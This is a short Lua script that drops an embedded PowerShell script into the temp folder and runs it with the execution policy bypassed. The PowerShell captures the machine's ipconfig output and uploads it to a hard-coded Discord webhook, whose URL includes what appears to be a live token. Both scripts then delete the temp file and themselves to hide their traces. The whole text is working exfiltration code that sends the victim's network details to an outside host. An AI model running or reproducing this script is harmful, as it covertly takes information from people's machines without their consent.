local psScript = [[
$webhook = "https://discord.com/api/webhooks/1466970722344636417/IWe90bOs6j9jC7PTrns-Pe48PbqiUfl9cNrPKOvq5vziGz3hh6DNFQSUzd3QVvyHOU5e"
$tempFile = "$env:TEMP\ipconfig.txt"
ipconfig | Out-File $tempFile -Encoding UTF8

$boundary = [System.Guid]::NewGuid().ToString()
$lineBreak = "`r`n"
$fileBytes = [System.IO.File]::ReadAllBytes($tempFile)

$bodyLines = (
    "--$boundary",
    "Content-Disposition: form-data; name=`"file`"; filename=`"ipconfig.txt`"",
    "Content-Type: text/plain",
    "",
    [System.Text.Encoding]::UTF8.GetString($fileBytes),
    "--$boundary--"
) -join $lineBreak

$encoding = [System.Text.Encoding]::UTF8
$bodyBytes = $encoding.GetBytes($bodyLines)

$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

try {
    Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $bodyBytes
    Write-Host "Файл успешно отправлен в Discord" -ForegroundColor Green
} catch {
    Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
} finally {
    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
}
]]

local scriptPath = os.getenv("TEMP") .. "\\send_ipconfig.ps1"
local file = io.open(scriptPath, "w")
file:write(psScript)
file:close()

os.execute('powershell -ExecutionPolicy Bypass -File "' .. scriptPath .. '"')
os.execute('del "' .. scriptPath .. '"')